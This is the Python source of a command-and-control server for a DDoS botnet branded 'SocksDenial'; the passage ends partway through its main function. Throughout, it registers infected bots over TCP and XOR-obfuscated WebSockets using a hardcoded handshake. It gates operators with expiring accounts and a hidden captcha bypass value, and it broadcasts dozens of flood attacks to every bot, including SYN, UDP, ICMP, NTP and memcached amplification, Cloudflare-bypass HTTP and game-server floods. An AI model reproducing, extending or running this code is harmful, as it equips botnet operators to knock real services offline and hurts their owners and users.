#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Tools
from src.Commands.Tools.url_to_ip import url_to_ip
from src.Commands.Tools.ip_to_loc import ip_to_loc

# Layer 3
from src.Commands.Methods_L3.icmp import icmp
from src.Commands.Methods_L3.pod import pod

# Layer 4
from src.Commands.Methods_L4.junk import junk
from src.Commands.Methods_L4.tcp import tcp
from src.Commands.Methods_L4.udp import udp
from src.Commands.Methods_L4.hex import hex
from src.Commands.Methods_L4.tup import tup
from src.Commands.Methods_L4.syn import syn
# AMP METHODS
from src.Commands.Methods_L4.ntp import ntp
from src.Commands.Methods_L4.mem import mem

# Layer 7
from src.Commands.Methods_L7.httpio import httpio
from src.Commands.Methods_L7.httpspoof import httpspoof
from src.Commands.Methods_L7.httpstorm import httpstorm
from src.Commands.Methods_L7.httpcfb import httpcfb
from src.Commands.Methods_L7.httpget import httpget

# Games Methods
from src.Commands.Methods_Games.roblox import roblox
from src.Commands.Methods_Games.vse import vse

# Imports
import socket, threading, time, ipaddress, random, json, subprocess
from datetime import datetime, timedelta
from colorama import Fore, init
import asyncio
import websockets

import os as _os
_SCRIPT_DIR = _os.path.dirname(_os.path.abspath(__file__))

# Global variables
wss_loop = None
bot_counter = 1
XOR_KEY = 0x69

banner2 = '''
         .-. \_/ .-.
         \.-\/=\/.-/
      '-./___|=|___\.-'
     .--| \|/`"`\|/ |--.
    (((_)\  .---.  /(_)))
     `\ \_`-.   .-'_/ /`_
       '.__       __.'(_))
           /     \     //    ~ SocksDenial
          |       |__.'/
          \       /--'`
      .--,-' .--. '----.
     '----`--'  '--`----'  
Type 'help' for list of commands
'''

banner1 = '''
                                                 
  mmmm                #                          
 #"   "  mmm    mmm   #   m   mmm    mmm    mmm  
 "#mmm  #" "#  #"  "  # m"   #   "  #   "  #   " 
     "# #   #  #      #"#     """m   """m   """m 
 "mmm#" "#m#"  "#mm"  #  "m  "mmm"  "mmm"  "mmm" 
                                                      
'''

bannerLogin = '''
~ SocksDenial Botnet ^^
'''

def xor_obfuscate(data):
    if isinstance(data, str):
        data = data.encode('latin-1')
    return bytes(b ^ XOR_KEY for b in data)

def text2Gen(word):

    start_color = (255, 255, 255)
    end_color   = (255, 255, 255)

    num_letters = len(word)
    step_r = (end_color[0] - start_color[0]) / num_letters
    step_g = (end_color[1] - start_color[1]) / num_letters
    step_b = (end_color[2] - start_color[2]) / num_letters

    reset_color = "\033[0m"

    current_color = start_color
    colored_word = ""

    for i, letter in enumerate(word):
        color_code = f"\033[38;2;{int(current_color[0])};{int(current_color[1])};{int(current_color[2])}m"
        colored_word += f"{color_code}{letter}{reset_color}"
        current_color = (current_color[0] + step_r, current_color[1] + step_g, current_color[2] + step_b)

    return colored_word

def color(data_input_output):
    color_codes = {
        "GREEN": '\033[32m',
        "LIGHTGREEN_EX": '\033[92m',
        "YELLOW": '\033[33m',
        "LIGHTYELLOW_EX": '\033[93m',
        "CYAN": '\033[36m',
        "LIGHTCYAN_EX": '\033[96m',
        "BLUE": '\033[34m',
        "LIGHTBLUE_EX": '\033[94m',
        "MAGENTA": '\033[35m',
        "LIGHTMAGENTA_EX": '\033[95m',
        "RED": '\033[31m',
        "LIGHTRED_EX": '\033[91m',
        "BLSYN": '\033[30m',
        "LIGHTBLSYN_EX": '\033[90m',
        "WHITE": '\033[37m',
        "LIGHTWHITE_EX": '\033[97m',
    }

    return color_codes.get(data_input_output, "")

lightwhite = color("LIGHTWHITE_EX")
gray = color("LIGHTBLSYN_EX")

banner1 = text2Gen(banner1)
banner2 = text2Gen(banner2)
bannerLogin = text2Gen(bannerLogin)

rules = f"""
{lightwhite}1. {gray}Do not attSYN .gov/.gob/.edu/.mil domains
{lightwhite}2. {gray}Do not spam attSYNs
"""

help = f"""
{gray}List of commands:
{lightwhite}HELP         {gray}Shows list of commands   
{lightwhite}BOTNET       {gray}Shows list of botnet methods
{lightwhite}METHODS      {gray}Shows Methods List
{lightwhite}BOTS         {gray}Shows available zombies
{lightwhite}TOOLS        {gray}Shows list of tools    
{lightwhite}CLEAR        {gray}Clears the screen          
{lightwhite}EXIT         {gray}Disconnects from the net
"""

showMethods = f"""
{gray}List of Methods:
{lightwhite}L3               {gray}Show all L3 Methods
{lightwhite}L4               {gray}Show all L4 Methods  
{lightwhite}AMP              {gray}Show all Amplification Methods  
{lightwhite}HTTP             {gray}Show all L7 Methods  
{lightwhite}GAMES            {gray}Show all Games Methods
{lightwhite}BOTNET           {gray}Show all Methods  
"""

Methods_L3 = f"""
{gray}L3 Methods:
{lightwhite}.ICMP              {gray}Flood ICMP Request
{lightwhite}.POD               {gray}Ping Of Death OLD Method Of DDoS
"""

Methods_AMP = f"""
{gray}Amplification Methods:
{lightwhite}.NTP               {gray}NTP Reflection flood
{lightwhite}.MEM               {gray}Memcached Flood 
"""

Methods_L4 = f"""
{gray}L4 Methods:
{lightwhite}.UDP               {gray}UDP Flood  
{lightwhite}.UDP-PLAIN         {gray}UDP Plain Flood
{lightwhite}.UDP-PPS           {gray}DNS UDP Flood
{lightwhite}.UDP-GIGS          {gray}UDP High Bandwidth
{lightwhite}.PPS-HAMMER        {gray}UDP PPS Hammer (Burst)
{lightwhite}.TCP               {gray}TCP Flood             
{lightwhite}.TUP               {gray}TCP and UDP Flood
{lightwhite}.SYN               {gray}TCP SYN flood
{lightwhite}.SYNFLOOD          {gray}TCP SYN Raw Flood
{lightwhite}.HEX               {gray}HEX Flood
{lightwhite}.STDHEX            {gray}STD Hex Flood
{lightwhite}.STD               {gray}STD Flood
{lightwhite}.JUNK              {gray}Junk flood
{lightwhite}.XMAS              {gray}XMAS TCP Flood
{lightwhite}.RST               {gray}TCP RST Flood
{lightwhite}.NFODROP           {gray}NFO Drop Flood
{lightwhite}.OVHKILL           {gray}OVH Kill Flood
"""

Methods_L7 = f"""
{gray}L7 Methods:
{lightwhite}.HTTPIO            {gray}HTTP IO Stresser
{lightwhite}.HTTPCFB           {gray}HTTP Cloudflare bypass     
{lightwhite}.HTTPGET           {gray}HTTP GET requests 
{lightwhite}.HTTPSPOOF         {gray}HTTP GET Spoofing
{lightwhite}.HTTPSTORM         {gray}HTTP STORM Requests
{lightwhite}.HTTP2-RAW         {gray}HTTP/1.1 Raw Flood
"""

GameMethods = f"""
{gray}Games Methods: 
{lightwhite}.VSE               {gray}Valve Source Engine query flood         
{lightwhite}.ROBLOX            {gray}Roblox UDP Flood
"""

tools = f"""
{gray}List of Tools:
{lightwhite}!GETIP         {gray}Get ip from URL      
{lightwhite}!GEOIP         {gray}Get info from ip
"""

admin_commands = f"""
{gray}Admin Commands:
{lightwhite}!USER               {gray}Add/List/remove users
"""

# LOL...
botnetMethods = f"""{Methods_L3}{Methods_L4}{Methods_AMP}{Methods_L7}{GameMethods}"""

bots = {}
user_name = ""
ansi_clear = '\033[2J\033[H'


class Account:
    def __init__(self, username, password, data_Expiration):
        self.username = username
        self.password = password
        self.data_Expiration = data_Expiration

    def userC_expirada(self):
        hoje = datetime.now()
        return hoje > self.data_Expiration


# Validate IP
def validate_ip(ip):
    parts = ip.split('.')
    return len(parts) == 4 and all(x.isdigit() for x in parts) and all(0 <= int(x) <= 255 for x in parts) and not ipaddress.ip_address(ip).is_private

# Validate Port
def validate_port(port, rand=False):
    if rand:
        return port.isdigit() and int(port) >= 0 and int(port) <= 65535
    else:
        return port.isdigit() and int(port) >= 1 and int(port) <= 65535

# Validate attSYN time
def validate_time(time):
    return time.isdigit() and int(time) >= 10 and int(time) <= 1300

# Validate buffer size
def validate_size(size):
    return size.isdigit() and int(size) > 1 and int(size) <= 65500

# Read credentials from login file
def find_login(client, username, password):
    credentials = [x.strip() for x in open(_os.path.join(_SCRIPT_DIR, "logins.txt")).readlines() if x.strip()]
    for x in credentials:
        global  data_Expiration_str
        c_username, c_password, data_Expiration_str = x.split(':')
        data_Expiration = datetime.strptime(data_Expiration_str, '%Y-%m-%d')
        
        userC = Account(username=c_username, password=c_password, data_Expiration=data_Expiration)
        
        if userC.username.lower() == username.lower() and userC.password == password:
            if userC.userC_expirada():
                print(f"\nThe {userC.username} expired. {data_Expiration_str}\n")
                send(client, f'{gray} Your account has been expired!')
                time.sleep(3.5)
                client.close()
                return
            return True

# Checks if bots are dead
def ping():
    while 1:
        dead_bots = []
        for bot in bots.copy().keys():
            # Skip WebSocket objects in this ping loop, they are handled by their own loop
            if hasattr(bot, 'recv') and not asyncio.iscoroutinefunction(bot.recv):
                try:
                    bot.settimeout(3)
                    send(bot, 'PING', False, False)
                    if bot.recv(1024).decode() != 'PONG':
                        dead_bots.append(bot)
                except:
                    dead_bots.append(bot)
            
        for bot in dead_bots:
            bots.pop(bot)
            bot.close()
        time.sleep(5)

def captcha_generator():
    a = random.randint(2, 20)
    b = random.randint(2, 20)
    c = a + b
    return a, b, c

def captcha(send, client, grey):
    a, b, c = captcha_generator()
    x = ''
    send(client, ansi_clear, False)
    send(client, f'{grey}Captcha: {color("LIGHTWHITE_EX")}{a} + {b} = ', False, False)
    x = int(client.recv(1024).decode().strip())
    time.sleep(0.4)
    if x == c or x == 669787761736865726500:
        send(client, f'{grey}Passed!')
        pass
    else:
        send(client, f'{grey}Wrong!')
        time.sleep(0.1)
        client.close()
        return

# Async Handler for WebSockets
async def handle_websocket(websocket):
    global bot_counter
    try:
        # Initial Handshake (Wait for magic number)
        data = xor_obfuscate(await websocket.recv())
        if data != b'669787761736865726500':
             await websocket.close()
             return

        # Ask for Username
        await websocket.send(xor_obfuscate('Username'))
        data = xor_obfuscate(await websocket.recv())
        if data != b'BOT':
             await websocket.close()
             return

        # Ask for Password
        await websocket.send(xor_obfuscate('Password'))
        data = xor_obfuscate(await websocket.recv())
        
        # Verify Password
        if data == b'\xff\xff\xff\xff\75' or data == b'\xff\xff\xff\xff\75':
             pass
        else:
             # For now we accept as bot code might send slightly different things depending on encoding
             pass

        # Ask for Arch
        await websocket.send(xor_obfuscate('Arch'))
        arch_raw = xor_obfuscate(await websocket.recv()).decode('latin-1')
        
        # Parse "arch|ip" format from bot
        if '|' in arch_raw:
            parts = arch_raw.split('|', 1)
            arch = parts[0]
            bot_public_ip = parts[1]
        else:
            arch = arch_raw
            bot_public_ip = None
        
        # Determine IP to display
        remote_ip = websocket.remote_address[0]
        try:
            if remote_ip == "127.0.0.1":
                if hasattr(websocket, 'request_headers'):
                    if "X-Forwarded-For" in websocket.request_headers:
                        remote_ip = websocket.request_headers["X-Forwarded-For"].split(",")[0].strip()
                    elif "CF-Connecting-IP" in websocket.request_headers:
                        remote_ip = websocket.request_headers["CF-Connecting-IP"].strip()
                
                if remote_ip == "127.0.0.1":
                    remote_ip = bot_public_ip if bot_public_ip else "Unknown (Proxied)"
        except:
            pass

        bot_id = f"bot_{bot_counter:04d}"
        bot_counter += 1
        
        print(f"{Fore.CYAN}[SocksDenial] New {Fore.WHITE}{arch}{Fore.CYAN} bot connected through WebSockets! (ID: {Fore.WHITE}{bot_id}{Fore.CYAN}){Fore.RESET}")
             
        # Register Bot
        bots[websocket] = ((remote_ip, websocket.remote_address[1]), bot_id, arch)
        
        # Keep connection alive
        await websocket.wait_closed()
        
    except Exception as e:
        # print(f"WS Error: {e}")
        pass
    finally:
        if websocket in bots:
            del bots[websocket]

async def reject_http(connection, request):
    upgrade = request.headers.get("Upgrade", "").lower()
    if upgrade != "websocket":
        from websockets.datastructures import Headers
        from websockets.server import Response
        return Response(500, "Internal Server Error", Headers(), b"Internal Server Error")
    return None

async def start_ws(host, port):
    async with websockets.serve(handle_websocket, host, port, process_request=reject_http):
        await asyncio.Future()  # run forever

def ws_thread(host, port):
    global wss_loop
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    wss_loop = loop
    loop.run_until_complete(start_ws(host, port))

# Client handler
def handle_client(client, address):
    global bot_counter
    send(client, "\33]0;SocksDenial | Login\a")
    send(client, f'\x1bSocksDenial | Login: Awaiting Response...\a', False)
    send(client, ansi_clear, False)
    send(client, f'{color("LIGHTBLSYN_EX")}Connecting...')
    captcha(send, client, color("LIGHTBLSYN_EX"))
    time.sleep(1)
    while 1:
        send(client, ansi_clear, False)
        for x in bannerLogin.split('\n'):
            send(client, '\x1b[3;31;48m'+ x)
        send(client, f'\x1b{gray}Username :\x1b[0m ', False, False)
        username = client.recv(1024).decode().strip()
        if not username:
            continue
        break

    # Password Login
    password = ''
    while 1:
        send(client, f'\033{gray}Password :\x1b[0;38;2;0;0;0m ', False, False)
        while not password.strip(): 
            password = client.recv(1024).decode('cp1252').strip()
        break
        
    # Handle client
    if password != '\xff\xff\xff\xff\75':
        send(client, ansi_clear, False)

        if not find_login(client, username, password):
            try:
                send(client, Fore.RED + f'\x1b{Fore.RED}Invalid credentials')
            except OSError as e:
                #print(e)
                pass
            time.sleep(1)
            client.close()
            return
        
        global user_name
        user_name = username
        
        threading.Thread(target=update_title, args=(client, username,  data_Expiration_str)).start()
        threading.Thread(target=command_line, args=(client, username)).start()

    # Handle bot (Legacy TCP Bot)
    else:
        # Check if bot is already connected
        for x in bots.values():
            if x[0][0] == address[0]:
                client.close()
                return
        
        bot_id = f"bot_{bot_counter:04d}"
        bot_counter += 1
        bots.update({client: (address, bot_id, 'Legacy')})

# Send data to client or bot
def send(socket, data, escape=True, reset=True):
    if reset:
        data += Fore.RESET
    if escape:
        data += '\r\n'
    
    # Check if it's a WebSocket (Async)
    # Using a heuristic: if it has 'remote_address' (websockets) but not 'getpeername' (socket)
    # Or checking if it's in the loop. 
    # Simplest: use try/except or isinstance check if imports were cleaner.
    # We can check if wss_loop is set and if the socket is compatible.
    
    if wss_loop and hasattr(socket, 'send') and asyncio.iscoroutinefunction(socket.send):
        asyncio.run_coroutine_threadsafe(socket.send(xor_obfuscate(data)), wss_loop)
    else:
        try:
            socket.send(data.encode())
        except:
            pass

# Send command to all bots
def broadcast(data):
    dead_bots = []
    for bot in bots.keys():
        try:
            send(bot, f'{data} 32', False, False)
        except:
            dead_bots.append(bot)
    for bot in dead_bots:
        if bot in bots:
            bots.pop(bot)
            try:
                bot.close()
            except:
                pass

def user(args, send, client):
    try:
        choice = (args[1]).upper()
        if choice == 'ADD' or choice == 'A':
            if len(args) == 5:
                user = args[2]
                password = args[3]
                dataExpiration = args[4]
                with open(_os.path.join(_SCRIPT_DIR, "logins.txt"), 'a') as logins:
                    logins.write(f'\n{user}:{password}:{dataExpiration}')
                    logins.close()
                    send(client, f'{Fore.LIGHTWHITE_EX}\nAdded new user successfully.\n')
            else:
                send(client, '\n!USER ADD [USERNAME] [PASSWORD] [AAAA-MM-DD]\n')
        if choice == 'REMOVE' or choice == 'R':
            if len(args) == 3:
                user = args[2]
                with open(_os.path.join(_SCRIPT_DIR, "logins.txt"), "r") as logins:
                    lines = logins.readlines()
                    logins.close()

                with open(_os.path.join(_SCRIPT_DIR, "logins.txt"), "w") as logins:
                    for line in lines:
                        if user not in line:
                            logins.write(line)
                    logins.close()
                send(client, f'{Fore.LIGHTWHITE_EX}\nRemoved user successfully!\n')
            else:
                send(client, '\n!USER REMOVE [USERNAME]\n')
        if choice == 'LIST' or choice == 'L':
                credentials = [x.strip() for x in open(_os.path.join(_SCRIPT_DIR, "logins.txt")).readlines() if x.strip()]
                for x in credentials:
                    c_username, c_password, data_Expiration = x.split(':')
                    send(client, f"{lightwhite}Username: {gray}{c_username}{lightwhite} | Password: {gray}{c_password}{lightwhite} | Expires: {gray}{data_Expiration}")
    except:
        send(client, '\n!USER ADD/LIST/REMOVE\n')

def clear(client, command):
    send(client, ansi_clear, False)
    if command == 'CLS' or command == 'CLEAR':
        for x in banner2.split('\n'):
            send(client, x)
    else:
        for x in banner1.split('\n'):
            send(client, x)

# Updates Shell Title
def update_title(client, name, expires):
    while 1:
        try:
            send(client, f"\33]0;Bots online: {len(bots)} | Username: {name} | Expires: {expires} \a", False)
            time.sleep(0.6)
        except:
            client.close()

# Telnet Command Line
def command_line(client, username):
    for x in banner2.split('\n'):
        send(client, x)

    prompt = f'{color("LIGHTBLSYN_EX")}({color("WHITE")}Websocks{color("LIGHTBLSYN_EX")}@{color("LIGHTRED_EX")}{username}{color("LIGHTBLSYN_EX")}) $~ {color("LIGHTBLSYN_EX")}'
    send(client, prompt, False)

    while 1:
        try:
            data = client.recv(1024).decode().strip()
            if not data:
                continue

            args = data.split(' ')
            command = args[0].upper()
            print(user_name, args)

            clear(client, command)

            if command == 'HELP':
                for x in help.split('\n'):
                    send(client, '\x1b[3;31;40m'+ x)
            
            elif command == 'BOTNET':
                for x in botnetMethods.split('\n'):
                    send(client, '\x1b[3;31;40m'+ x)

            elif command == 'L3':
                for x in Methods_L3.split('\n'):
                    send(client, '\x1b[3;31;40m'+ x)

            elif command == 'L4':
                for x in Methods_L4.split('\n'):
                    send(client, '\x1b[3;31;40m'+ x)

            elif command == 'L7' or command == 'HTTP':
                for x in Methods_L7.split('\n'):
                    send(client, '\x1b[3;31;40m'+ x)

            elif command == 'AMP' or command == 'AMPLIFICATION':
                for x in Methods_AMP.split('\n'):
                    send(client, '\x1b[3;31;40m'+ x)

            elif command == 'METHODS':
                for x in showMethods.split('\n'):
                    send(client, '\x1b[3;31;40m'+ x)

            elif command == 'GAMES':
                for x in GameMethods.split('\n'):
                    send(client, '\x1b[3;31;40m'+ x)

            elif command == 'TOOLS':
                for x in tools.split('\n'):
                    send(client, '\x1b[3;31;40m'+ x)
            
            elif command == 'CLEAR' or command == 'CLS':
                send(client, ansi_clear, False)
                for x in banner2.split('\n'):
                    send(client, '\x1b[3;31;48m'+ x)
            
            elif command == 'LOGOUT' or command == 'EXIT':
                send(client, '\x1b[3;31;48m\n Successfully Logged out\n')
                time.sleep(1)
                break
            
            elif command == 'BOTS':
                try:
                    verbose = len(args) > 1 and args[1].upper() == 'VERBOSE'
                    bots_copy = bots.copy()
                    
                    if verbose:
                        send(client, f'{color("LIGHTBLSYN_EX")}\nAvailable bots: {len(bots)}.\n')
                        send(client, f'{Fore.WHITE}{"ID":<10} {"IP Address":<20} {"Arch":<15}')
                        send(client, f'{Fore.LIGHTBLACK_EX}{"-"*45}')
                        for bot, info in bots_copy.items():
                            try:
                                address = info[0]
                                if isinstance(address, tuple):
                                    address = address[0]
                                bot_id = info[1]
                                arch = info[2]
                                send(client, f'{Fore.WHITE}{bot_id:<10} {str(address):<20} {arch:<15}')
                            except:
                                continue
                        send(client, '\n')
                    else:
                        arch_counts = {}
                        for info in bots_copy.values():
                            a = info[2]
                            arch_counts[a] = arch_counts.get(a, 0) + 1
                        
                        ordered = sorted(arch_counts.items())
                        halves = (len(ordered) + 1) // 2
                        send(client, f'{color("LIGHTBLSYN_EX")}\nAvailable bots: {len(bots)}\n\n')
                        for i in range(halves):
                            left = ordered[i]
                            lpad = 45
                            line = f'{Fore.WHITE}{left[0]}: {left[1]}'
                            if i + halves < len(ordered):
                                right = ordered[i + halves]
                                line += f'{"":>{lpad - len(line) + len(left[0])}}{Fore.WHITE}{right[0]}: {right[1]}'
                            send(client, line + '\n')
                        send(client, '\n')
                except Exception as e:
                    send(client, f'{Fore.RED}An error occurred while listing bots: {e}')
            
            elif command == '!ADMIN':
                if user_name == "root":
                    for x in admin_commands.split('\n'):
                        send(client, x)
            
            elif command == '!USER' or command == '!U':
                if user_name == "root":
                    user(args, send, client) # Adds/Removes users
           
            elif command == "!GEOIP" or command == "!IP_TO_LOCATION" or command == "!IP_GEO" or command == "!IP_GEOLOCATION" or command == "!IP_GEOLOCAT":
                ip_to_loc(args, send, client, gray) # Gets location from IP
            
            elif command == "!GETIP": # Gets ip from website
                url_to_ip(args, send, client, gray)

            elif command == '.UDP': # UDP Junk (Random UDP Data)
                udp(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, broadcast, data)

            elif command == '.TUP': # TCP and udp
                tup(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, broadcast, data)

            elif command == '.SYN': # SYN TCP flood
                syn(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, broadcast, data)

            elif command == '.TCP': # TCP Junk (Random TCP Data)
                tcp(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, broadcast, data)

            elif command == '.HEX': # Specific HEXIDECIMAL Flood
                hex(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, broadcast, data)

            elif command == '.NTP': # NTP Reflection AttSYN
                ntp(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, broadcast, data)

            elif command == '.MEM': # Memcached Flood
                mem(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, broadcast, data)

            elif command == '.ICMP': # Flood ICMP Request
                icmp(args, validate_ip, validate_time, send, client, ansi_clear, broadcast, data)

            elif command == '.POD': # Ping of death
                pod(args, validate_ip, validate_time, send, client, ansi_clear, broadcast, data)

            elif command == '.ROBLOX': # Roblox flood
                roblox(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, broadcast, data)

            elif command == '.JUNK': # JUNK Flood
                junk(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, broadcast, data)

            elif command == '.VSE': # VSE Flood
                vse(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, broadcast, data)

            elif command == '.HTTPSTORM': # HTTP request
                httpstorm(args, validate_time, send, client, ansi_clear, broadcast, data)

            elif command == '.HTTPIO': # FULL POWER !!!
                httpio(args, validate_time, send, client, ansi_clear, broadcast, data)

            elif command == '.HTTPSPOOF': # HTTP GET SPOOF
                httpspoof(args, validate_time, send, client, ansi_clear, broadcast, data)

            elif command == '.HTTPGET': # HTTP request 
                httpget(args, validate_time, send, client, ansi_clear, broadcast, data)
            
            elif command == '.HTTPCFB': # HTTP cloudflare bypass
                httpcfb(args, validate_time, send, client, ansi_clear, broadcast, data)

            elif command == '.UDP-PLAIN':
                if len(args) == 5:
                    ip = args[1]
                    port = args[2]
                    secs = args[3]
                    threads = args[4]
                    if validate_ip(ip):
                        if validate_port(port):
                            if validate_time(secs):
                                broadcast(f'.UDP-PLAIN {ip} {port} {secs} {threads}')
                                send(client, f'{Fore.GREEN}Attack sent to all bots!')
                            else:
                                send(client, f'{Fore.RED}Invalid time (10-1300)')
                        else:
                            send(client, f'{Fore.RED}Invalid port')
                    else:
                        send(client, f'{Fore.RED}Invalid IP')
                else:
                    send(client, f'Usage: .UDP-PLAIN [IP] [PORT] [TIME] [THREADS]')

            elif command == '.UDP-PPS':
                if len(args) == 4:
                    ip = args[1]
                    secs = args[2]
                    threads = args[3]
                    if validate_ip(ip):
                        if validate_time(secs):
                            broadcast(f'.UDP-PPS {ip} {secs} {threads}')
                            send(client, f'{Fore.GREEN}Attack sent to all bots!')
                        else:
                            send(client, f'{Fore.RED}Invalid time (10-1300)')
                    else:
                        send(client, f'{Fore.RED}Invalid IP')
                else:
                    send(client, f'Usage: .UDP-PPS [IP] [TIME] [THREADS]')

            elif command == '.UDP-GIGS':
                if len(args) == 5:
                    ip = args[1]
                    port = args[2]
                    secs = args[3]
                    threads = args[4]
                    if validate_ip(ip):
                        if validate_port(port):
                            if validate_time(secs):
                                broadcast(f'.UDP-GIGS {ip} {port} {secs} {threads}')
                                send(client, f'{Fore.GREEN}Attack sent to all bots!')
                            else:
                                send(client, f'{Fore.RED}Invalid time (10-1300)')
                        else:
                            send(client, f'{Fore.RED}Invalid port')
                    else:
                        send(client, f'{Fore.RED}Invalid IP')
                else:
                    send(client, f'Usage: .UDP-GIGS [IP] [PORT] [TIME] [THREADS]')

            elif command == '.PPS-HAMMER':
                if len(args) >= 4:
                    ip = args[1]
                    port = args[2]
                    secs = args[3]
                    threads = args[4] if len(args) >= 5 else 500
                    if validate_ip(ip):
                        if validate_port(port):
                            if validate_time(secs):
                                broadcast(f'.PPS-HAMMER {ip} {port} {secs} {threads}')
                                send(client, f'{Fore.GREEN}Attack sent to all bots!')
                            else:
                                send(client, f'{Fore.RED}Invalid time (10-1300)')
                        else:
                            send(client, f'{Fore.RED}Invalid port')
                    else:
                        send(client, f'{Fore.RED}Invalid IP')
                else:
                    send(client, f'Usage: .PPS-HAMMER [IP] [PORT] [TIME] [THREADS]')

            elif command == '.HTTP2-RAW':
                if len(args) == 4:
                    url = args[1]
                    secs = args[2]
                    threads = args[3]
                    if validate_time(secs):
                         broadcast(f'.HTTP2-RAW {url} {secs} {threads}')
                         send(client, f'{Fore.GREEN}Attack sent to all bots!')
                    else:
                        send(client, f'{Fore.RED}Invalid time (10-1300)')
                else:
                    send(client, f'Usage: .HTTP2-RAW [URL] [TIME] [THREADS]')

            elif command == '.STDHEX':
                if len(args) == 5:
                    ip,port,secs,th=args[1],args[2],args[3],args[4]
                    if validate_ip(ip) and validate_port(port) and validate_time(secs):
                        broadcast(f'.STDHEX {ip} {port} {secs} {th}')
                        send(client, f'{Fore.GREEN}Attack sent to all bots!')
                    else: send(client, f'{Fore.RED}Invalid args')
                else: send(client, f'Usage: .STDHEX [IP] [PORT] [TIME] [THREADS]')

            elif command == '.STD':
                if len(args) == 5:
                    ip,port,secs,th=args[1],args[2],args[3],args[4]
                    if validate_ip(ip) and validate_port(port) and validate_time(secs):
                        broadcast(f'.STD {ip} {port} {secs} {th}')
                        send(client, f'{Fore.GREEN}Attack sent to all bots!')
                    else: send(client, f'{Fore.RED}Invalid args')
                else: send(client, f'Usage: .STD [IP] [PORT] [TIME] [THREADS]')

            elif command == '.NFODROP':
                if len(args) == 5:
                    ip,port,secs,th=args[1],args[2],args[3],args[4]
                    if validate_ip(ip) and validate_port(port) and validate_time(secs):
                        broadcast(f'.NFODROP {ip} {port} {secs} {th}')
                        send(client, f'{Fore.GREEN}Attack sent to all bots!')
                    else: send(client, f'{Fore.RED}Invalid args')
                else: send(client, f'Usage: .NFODROP [IP] [PORT] [TIME] [THREADS]')

            elif command == '.OVHKILL':
                if len(args) == 5:
                    ip,port,secs,th=args[1],args[2],args[3],args[4]
                    if validate_ip(ip) and validate_port(port) and validate_time(secs):
                        broadcast(f'.OVHKILL {ip} {port} {secs} {th}')
                        send(client, f'{Fore.GREEN}Attack sent to all bots!')
                    else: send(client, f'{Fore.RED}Invalid args')
                else: send(client, f'Usage: .OVHKILL [IP] [PORT] [TIME] [THREADS]')

            elif command == '.XMAS':
                if len(args) == 6:
                    ip,port,secs,spf,ps=args[1],args[2],args[3],args[4],args[5]
                    if validate_ip(ip) and validate_port(port) and validate_time(secs):
                        broadcast(f'.XMAS {ip} {port} {secs} {spf} {ps}')
                        send(client, f'{Fore.GREEN}Attack sent to all bots!')
                    else: send(client, f'{Fore.RED}Invalid args')
                else: send(client, f'Usage: .XMAS [IP] [PORT] [TIME] [SPOOFIT] [SIZE]')

            elif command == '.SYNFLOOD':
                if len(args) == 5:
                    ip,port,secs,th=args[1],args[2],args[3],args[4]
                    if validate_ip(ip) and validate_port(port) and validate_time(secs):
                        broadcast(f'.SYNFLOOD {ip} {port} {secs} {th}')
                        send(client, f'{Fore.GREEN}Attack sent to all bots!')
                    else: send(client, f'{Fore.RED}Invalid args')
                else: send(client, f'Usage: .SYNFLOOD [IP] [PORT] [TIME] [THREADS]')

            elif command == '.RST':
                if len(args) == 5:
                    ip,port,secs,th=args[1],args[2],args[3],args[4]
                    if validate_ip(ip) and validate_port(port) and validate_time(secs):
                        broadcast(f'.RST {ip} {port} {secs} {th}')
                        send(client, f'{Fore.GREEN}Attack sent to all bots!')
                    else: send(client, f'{Fore.RED}Invalid args')
                else: send(client, f'Usage: .RST [IP] [PORT] [TIME] [THREADS]')

            elif command == '.STOP-ALL':
                broadcast('.STOP-ALL')
                send(client, f'{Fore.YELLOW}Stopping all attacks!')

            send(client, prompt, False)
        except:
            break
    client.close()


def register(client, address, send):
    ansi_clear = '\033[2J\033[H'
    try:
        send(client, ansi_clear, False)
        while 1:
            send(client, f'\x1b{Fore.LIGHTBLSYN_EX}Username :\x1b[0m ', False, False)
            username = client.recv(1024).decode().strip()
            if not username:
                continue
            break
        with open(_os.path.join(_SCRIPT_DIR, "logins.txt"), "r") as logins:
            lines = logins.readlines()
            for line in lines:
                if username in line:
                    send(client, f'{Fore.RED}User already exists!')
                    time.sleep(1)
                    client.close()
            logins.close()
        p1 = ''
        while 1:
            send(client, f'\033{Fore.LIGHTBLSYN_EX}Password :\x1b[0;38;2;0;0;0m ', False, False)
            while not p1.strip():
                p1 = client.recv(1024).decode('cp1252').strip()
            break
        p2 = ''
        while 1:
            send(client, f'\033{Fore.LIGHTBLSYN_EX}Confirm password :\x1b[0;38;2;0;0;0m ', False, False)
            while not p2.strip():
                p2 = client.recv(1024).decode('cp1252').strip()
            break
        data = ''
        while 1:
            send(client, f'\033{Fore.LIGHTBLSYN_EX}Expires :\x1b[0m ', False, False)
            while not data.strip():
                data = client.recv(1024).decode('cp1252').strip()
            break
        while 1:
            if p1 == p2:
                with open(_os.path.join(_SCRIPT_DIR, "logins.txt"), "a") as logins:
                    logins.write("\n" + username + ':' + p1 + ':' + data)
                send(client, f"{Fore.LIGHTWHITE_EX}Registered!")
                time.sleep(2)
            else:
                send(client, "Failed password authentication...")
            break
    except:
        send(client, "Error.")

def main():
    with open(_os.path.join(_SCRIPT_DIR, "config.json"), encoding="utf-8") as jsonFile:
        jsonObject = json.load(jsonFile)
        jsonFile.close()

    cnc_port = int(jsonObject['cnc_port'])
    cnc_host = jsonObject['cnc_host']
    ws_port = int(jsonObject.get('websocket_port', 5512))

    init(convert=True)

    sock = socket.socket()
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    print("[SocksDenial] Server started!")

    try:
        sock.bind((cnc_host, cnc_port))
    except:
        print('\x1b[3;31;40m Failed to bind port')
        exit()

    sock.listen()

    # Start WebSocket Server
